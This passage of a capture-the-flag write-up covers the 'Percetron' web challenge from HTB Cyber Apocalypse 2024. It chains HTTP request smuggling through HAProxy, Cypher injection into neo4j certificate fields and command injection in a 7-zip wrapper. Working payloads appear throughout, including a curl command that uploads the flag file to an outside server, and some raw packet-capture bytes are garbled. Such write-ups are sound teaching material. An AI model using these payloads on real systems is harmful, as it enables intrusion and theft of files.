Set-Cookie: connect.sid=s%3ADqxxBDsaqUZrSzTnEtkGlrVLO89b8KBY.k1WTa8T5CRYcxOKL1mcjRoI4GZXtcq2YSDsIAvKOQUk; Path=/; HttpOnly  
Date: Thu, 14 Mar 2024 12:24:53 GMT
Connection: keep-alive
Keep-Alive: timeout=5

&lt;html&gt;
&lt;head&gt;&lt;title&gt;Error: Missing parameters&lt;/title&gt;&lt;meta charset="utf-8"&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
&lt;link rel="shortcut icon" type="image/jpeg" href="icon"&gt;
&lt;link rel="stylesheet" href="/static/css/bootstrap.min.css"&gt;
&lt;link rel="stylesheet" href="/static/css/line-awesome.min.css"&gt;
&lt;link rel="stylesheet" href="/static/css/main.css"&gt;
&lt;link rel="stylesheet" href="/static/css/sidebar.css"&gt;
&lt;link rel="stylesheet" href="/static/css/topnav.css"&gt;
&lt;script src="/static/js/bootstrap.bundle.min.js"&gt;&lt;/script&gt;
&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;
&lt;script src="/static/js/sidebar.js"&gt;&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;div class="container center"&gt;
&lt;div class="row"&gt;
&lt;div class="col-md-6 offset-md-3"&gt;
&lt;div class="card p-4 jumbotron"&gt;
&lt;h3&gt;Error&lt;/h3&gt;&lt;p&gt;Missing parameters&lt;/p&gt;&lt;div class="btn-group btn-block"&gt;
&lt;button class="btn primaryBtn mt-4" onclick="window.history.back();"&gt;Back&lt;/button&gt;
&lt;button class="btn primaryBtn mt-4" onclick="window.location.href='/'"&gt;Home&lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/htmlehBE4@@8
              S=4W(
]']'eCE5@@~
           4WHS=)
]']'&gt;eBE4@@8
            HS=4X(
]']'eBE4@@~
           4XHS=(
];$]'eE4@@8
           HS=4Y(
];%];$e&BE4@@~
              4YHS&gt;(
</code></pre></div><p>It is a bit weird to read but we see that HA-Proxy is transforming our HTTP request as <code>Transfer-Encoding: chunked</code>. This might happen because the <code>Content-Length</code> header is not read due to the empty header.</p><p>After a lot of tests, I decided to try HTTP/1.0, which was also mentioned on the <a href="https://git.haproxy.org/?p=haproxy.git;a=commitdiff;h=a8598a2">Git issue</a>, and the HTTP request smuggling attack worked!</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-4.webp" alt="Percetron 4"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">``POST /panel/login HTTP/1.0
host: 127.0.0.1:1337
connection: keep-alive

GET /healthcheck-dev HTTP/1.1
Host: 127.0.0.1:3000
Cookie: connect.sid=s%3AlPQ3OEP-p97KH2kOWLgzS5zV6lJ75683.sfnADEVOu%2BufjwtP8W%2B8vY7kfgcQpUU83EqY%2FXeMLL0

BE4NX@@i
        u(
ENY@@
     u
``HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1060
ETag: W/"424-qLUzAi9KX/2MAcYPkCsictUtg4A"
Set-Cookie: connect.sid=s%3AIENOwcfX7YCod4ZfWpGZb2vV62Muyt4y.zceAhjNahxv0jbgMlDLUo3%2FFj0Dk6xm1BpTmTbrmbuE; Path=/; HttpOnly  
Date: Thu, 14 Mar 2024 12:28:35 GMT
Connection: keep-alive
Keep-Alive: timeout=5

&lt;html&gt;
&lt;head&gt;&lt;title&gt;Error: Missing parameters&lt;/title&gt;&lt;meta charset="utf-8"&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
&lt;link rel="shortcut icon" type="image/jpeg" href="icon"&gt;
&lt;link rel="stylesheet" href="/static/css/bootstrap.min.css"&gt;
&lt;link rel="stylesheet" href="/static/css/line-awesome.min.css"&gt;
&lt;link rel="stylesheet" href="/static/css/main.css"&gt;
&lt;link rel="stylesheet" href="/static/css/sidebar.css"&gt;
&lt;link rel="stylesheet" href="/static/css/topnav.css"&gt;
&lt;script src="/static/js/bootstrap.bundle.min.js"&gt;&lt;/script&gt;
&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;
&lt;script src="/static/js/sidebar.js"&gt;&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;div class="container center"&gt;
&lt;div class="row"&gt;
&lt;div class="col-md-6 offset-md-3"&gt;
&lt;div class="card p-4 jumbotron"&gt;
&lt;h3&gt;Error&lt;/h3&gt;&lt;p&gt;Missing parameters&lt;/p&gt;&lt;div class="btn-group btn-block"&gt;
&lt;button class="btn primaryBtn mt-4" onclick="window.history.back();"&gt;Back&lt;/button&gt;
&lt;button class="btn primaryBtn mt-4" onclick="window.location.href='/'"&gt;Home&lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
BE4!@@eeS
       u(
CE5NZ@@f
        u)
BE4"@@e
       u(
``se\e^EPN[@@J
              uD
`
 `HTTP/1.1 400 Bad Request
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 41
ETag: W/"29-pbacTK67vUwlSvfPQwByciu+4gI"
Date: Thu, 14 Mar 2024 12:28:35 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"Mandatory URL not specified"segeBE4#@@e
                                                   u4(
`
 `
  seeBE4$@@e
            u4(
`
 `
  seeBE4%@@e
            u4(
</code></pre></div><p>This approach actually worked because there is no <code>Transfer-Encoding: chunked</code> in HTTP/1.0, so the HA-Proxy just forwards the whole request to Express, which takes the first block as an empty request and then processes the second block.</p><p>At this point, we can take the above Gopher / MongoDB payload and use it to insert an <code>administrator</code> user on the remote instance of the challenge (we need to use double URL-encoding):</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-5.webp" alt="Percetron 5"></p><p>And at this point we are <code>administrator</code> (notice that we have a &ldquo;Management&rdquo; tab):</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-6.webp" alt="Percetron 6"></p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-7.webp" alt="Percetron 7"></p><h2 id="getting-rce">Getting RCE</h2><p>Now that we have completed the first part, we must take a look at what we need to solve the challenge. We are forced to get Remote Code Execution (RCE) because the flag filename is randomized in the <code>entrypoint.sh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3"># Change flag name</span>
<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">/flag.txt</span><span class="mtk1"> </span><span class="mtk4">/flag$(</span><span class="mtk8">cat</span><span class="mtk4"> /dev/urandom </span><span class="mtk5">|</span><span class="mtk4"> </span><span class="mtk8">tr</span><span class="mtk4"> </span><span class="mtk6">-cd</span><span class="mtk4"> "a-f0-9" </span><span class="mtk5">|</span><span class="mtk4"> </span><span class="mtk8">head</span><span class="mtk4"> </span><span class="mtk6">-c</span><span class="mtk4"> </span><span class="mtk6">10</span><span class="mtk4">).txt</span>  
</code></pre></div><p>With <code>administrator</code> permission, we are able to add new certificates:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">"/panel/management/addcert"</span><span class="mtk1">, adminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">pem</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.pem;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">pubKey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.pubKey;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">privKey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.privKey;</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">pem</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">pubKey</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">privKey</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Missing parameters"</span><span class="mtk1">});</span>  

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Neo4jConnection</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">certCreated</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">addCertificate</span><span class="mtk1">({</span><span class="mtk4">"cert"</span><span class="mtk1">: </span><span class="mtk1">pem</span><span class="mtk1">, </span><span class="mtk4">"pubKey"</span><span class="mtk1">: </span><span class="mtk1">pubKey</span><span class="mtk1">, </span><span class="mtk4">"privKey"</span><span class="mtk1">: </span><span class="mtk1">privKey</span><span class="mtk1">});</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">certCreated</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Could not add certificate"</span><span class="mtk1">});</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/panel/management"</span><span class="mtk1">);</span>
<span class="mtk1">});</span>
</code></pre></div><p>Here, the server interacts with neo4j in function <code>addCertificate</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">addCertificate</span><span class="mtk1">(</span><span class="mtk9 mtki">cert</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">certPath</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk9">this</span><span class="mtk1">.certDir, </span><span class="mtk8">randomHex</span><span class="mtk1">(</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">".cert"</span><span class="mtk1">);</span>  
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">certInfo</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">parseCert</span><span class="mtk1">(</span><span class="mtk9 mtki">cert</span><span class="mtk1">.cert);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">certInfo</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">insertCertQuery</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`</span>
<span class="mtk4">      CREATE (:Certificate {</span>
<span class="mtk4">          common_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.commonName</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          file_name: '</span><span class="mtk5">${</span><span class="mtk1">certPath</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          org_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.organizationName</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          locality_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.localityName</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          state_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.stateOrProvinceName</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          country_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.countryName</span><span class="mtk5">}</span><span class="mtk4">'</span>
<span class="mtk4">      });</span>
<span class="mtk4">    `</span><span class="mtk1">;</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk8">runQuery</span><span class="mtk1">(</span><span class="mtk1">insertCertQuery</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8 mtku">fs</span><span class="mtk1">.</span><span class="mtk8">writeFileSync</span><span class="mtk1">(</span><span class="mtk1">certPath</span><span class="mtk1">, </span><span class="mtk9 mtki">cert</span><span class="mtk1">.cert);</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">    } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>
</code></pre></div><h3 id="cypher-injection-neo4j">Cypher injection (neo4j)</h3><p>As can be seen, we can enter a lot of attributes of a PKI certificate that will be managed by neo4j, which is a graph database. But there is an injection (known as Cypher Injection named after the neo4j language) because we are able to insert any string (similar to SQL injection). For more information, you can take a look at <a href="https://pentester.land/blog/cypher-injection-cheatsheet/">Pentester Land</a>.</p><p>The key here is that we are able to control the <code>file_name</code> attribute of the certificate by injecting inside <code>common_name</code>. Once we have an arbitrary file write, we can use <code>/panel/management/dl-certs</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/panel/management/dl-certs"</span><span class="mtk1">, adminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Neo4jConnection</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">certificates</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getAllCertificates</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">dirsArray</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [];</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk1">certificates</span><span class="mtk1">.length; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">cert</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">certificates</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">];</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">filename</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">cert</span><span class="mtk1">.file_name;</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">absolutePath</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">__dirname</span><span class="mtk1">, </span><span class="mtk1">filename</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">fileDirectory</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">dirname</span><span class="mtk1">(</span><span class="mtk1">absolutePath</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk1">dirsArray</span><span class="mtk1">.</span><span class="mtk8">push</span><span class="mtk1">(</span><span class="mtk1">fileDirectory</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk1">dirsArray</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk5">...new</span><span class="mtk1"> </span><span class="mtk7 mtki">Set</span><span class="mtk1">(</span><span class="mtk1">dirsArray</span><span class="mtk1">)];</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">zipArray</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [];</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">madeError</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk1">dirsArray</span><span class="mtk1">.</span><span class="mtk1">length</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">madeError</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">dir</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">dirsArray</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">];</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">zipName</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/tmp/"</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">randomHex</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">".zip"</span><span class="mtk1">;</span>

<span class="mtk1">        sevenzip.</span><span class="mtk8">compress</span><span class="mtk1">(</span><span class="mtk4">"zip"</span><span class="mtk1">, {</span><span class="mtk1">dir</span><span class="mtk1">: </span><span class="mtk1">dir</span><span class="mtk1">, </span><span class="mtk1">destination</span><span class="mtk1">: </span><span class="mtk1">zipName</span><span class="mtk1">, </span><span class="mtk1">is64</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">}, () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {}).</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>  
<span class="mtk1">            </span><span class="mtk1">madeError</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">        })</span>
<span class="mtk1">       </span>
<span class="mtk1">        </span><span class="mtk1">zipArray</span><span class="mtk1">.</span><span class="mtk8">push</span><span class="mtk1">(</span><span class="mtk1">zipName</span><span class="mtk1">);  </span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">madeError</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Error compressing files"</span><span class="mtk1">});</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">zipArray</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">});</span>
</code></pre></div><p>This endpoint takes all the available certificates from neo4j and uses an external library called <code>@steezcram/sevenzip</code> to compress all the certificates into a ZIP file. However, it is weird that the server does not allow to download the ZIP file&mldr; It only prints the value of <code>zipArray</code>, which contains a list with the different ZIP filenames.</p><p>Here, we started thinking in ways we could use Cypher injection to perform out-of-band requests and exfiltrate the flag, or even the ZIP file. This approach was not very affordable, because the flag is at the <code>/</code> directory, so the server must have compressed the whole filesystem&mldr;</p><h3 id="command-injection">Command injection</h3><p>While searching for vulnerabilities of <code>@steezcram/sevenzip</code>, we found out that it is a low-rated GitHub project, it had only 7 stars. So, there might be some vulnerability here.</p><p>In fact, we found out that it uses <code>child_process.execFile</code> using <code>shell = true</code>, so we might be able to inject commands.</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-8.webp" alt="Percetron 8"></p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-9.webp" alt="Percetron 9"></p><p>We can test a simple command injection payload inside the Docker container to see how the command is built:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/app # node
Welcome to Node.js v16.20.2.
Type ".help" for more information.
&gt; const sevenzip = require("@steezcram/sevenzip");
<span class="code-grey">undefined</span>
&gt; sevenzip.compress("zip", {dir: '/app; nc 0 4444 &lt; /fl*', destination: '/tmp/file.zip', is64: true}, () =&gt; {})
Promise {
  <span class="code-dark-cyan">&lt;pending&gt;</span>,
  [<span class="code-dark-green">Symbol(async_id_symbol)</span>]: <span class="code-dark-yellow">617</span>,
  [<span class="code-dark-green">Symbol(trigger_async_id_symbol)</span>]: <span class="code-dark-yellow">5</span>
}
&gt; Uncaught:
Error: Command failed: /app/node_modules/7zip-bin/linux/x64/7za a -tzip "/tmp/file.zip" "/app; nc 0 4444 &lt; /fl*" -mm=Deflate64 -bsp1  
/bin/sh: /app/node_modules/7zip-bin/linux/x64/7za: Permission denied

<span class="code-grey">    at __node_internal_genericNodeError (node:internal/errors:857:15)</span>
<span class="code-grey">    at ChildProcess.exithandler (node:child_process:402:12)</span>
<span class="code-grey">    at ChildProcess.emit (node:events:513:28)</span>
<span class="code-grey">    at ChildProcess.emit (node:domain:552:15)</span>
<span class="code-grey">    at maybeClose (node:internal/child_process:1100:16)</span>
<span class="code-grey">    at Socket.&lt;anonymous&gt; (node:internal/child_process:458:11)</span>
<span class="code-grey">    at Socket.emit (node:events:513:28)</span>
<span class="code-grey">    at Socket.emit (node:domain:552:15)</span> {
  code: <span class="code-dark-yellow">126</span>,
  killed: <span class="code-dark-yellow">false</span>,
  signal: <span class="code-white">null</span>,
  cmd: <span class="code-dark-green">'/app/node_modules/7zip-bin/linux/x64/7za a -tzip "/tmp/file.zip" "/app; nc 0 4444 &lt; /fl*" -mm=Deflate64 -bsp1'</span>
}
</code></pre></div><p>So, we know how to inject a command. We can test it using <code>curl</code> and <code>nc</code> in another shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; sevenzip.compress("zip", {dir: '";curl 127.0.0.1;"', destination: '/tmp/file.zip', is64: true}, () =&gt; {})  
Promise {
  <span class="code-dark-cyan">&lt;pending&gt;</span>,
  [<span class="code-dark-green">Symbol(async_id_symbol)</span>]: <span class="code-dark-yellow">1779</span>,
  [<span class="code-dark-green">Symbol(trigger_async_id_symbol)</span>]: <span class="code-dark-yellow">5</span>
}
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/app # nc -nlvp 80
Listening on [0.0.0.0] (family 0, port 80)  
Connection from 127.0.0.1 60554 received!
GET / HTTP/1.1
Host: 127.0.0.1
User-Agent: curl/7.70.0
Accept: */*
</code></pre></div><p>At this point, we could send us the flag from the remote container to a controled server, we just need to insert the above command injection payload inside the filename that will be inside the Cypher injection payload.</p><p>For this, we will take advantage of a function called <code>generateCert</code> in <code>challenge/util/x509.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; const { generateCert } = require('./util/x509')
<span class="code-grey">undefined</span>
&gt; let cert = generateCert(`', file_name: '/app/$(curl 12.34.56.78 -T /fl*)/asdf.crt', /*`, `*/ org_name: 'asdf`, 'locality', 'state', 'ES')  
<span class="code-grey">undefined</span>
&gt; console.log(cert.cert)
-----BEGIN CERTIFICATE-----
MIIDrTCCApWgAwIBAgIBATANBgkqhkiG9w0BAQUFADCBmTELMAkGA1UEBhMCRVMx
...
6Lj/RMVsOEvramCErbiJ0IaH9JVO6zVKfT8MnKCPo9Ot
-----END CERTIFICATE-----

<span class="code-grey">undefined</span>
&gt; console.log(cert.pubKey)
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuQEtEZk88w55N6LFlnhe
...
JQIDAQAB
-----END PUBLIC KEY-----

<span class="code-grey">undefined</span>
&gt; console.log(cert.privKey)
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAuQEtEZk88w55N6LFlnheKcSJ7i9HUQFyFX5aVIOUhkXgKLq5
...
UilBqoI2Lh2gkm9NuIDAchuYYk+sOfVd1AWqWKuAEO0F1UX1WqjZ
-----END RSA PRIVATE KEY-----

<span class="code-grey">undefined</span>
</code></pre></div><p>Not every command injection payload worked, but after a few tests we can get a working one.</p><p>Now, we simply copy the above certificate, public key and private key into the web application:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-10.webp" alt="Percetron 10"></p><p>Then, we save the certificate and finally we click on &ldquo;Download All&rdquo;.</p><h2 id="flag">Flag</h2><p>The server will execute our command injection payload and will send the flag to our controled server:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
Listening on 0.0.0.0 80
Connection received on 83.136.254.142 35628  
PUT /flag1e34fd6a77.txt HTTP/1.1
Host: 12.34.56.78
User-Agent: curl/7.70.0
Accept: */*
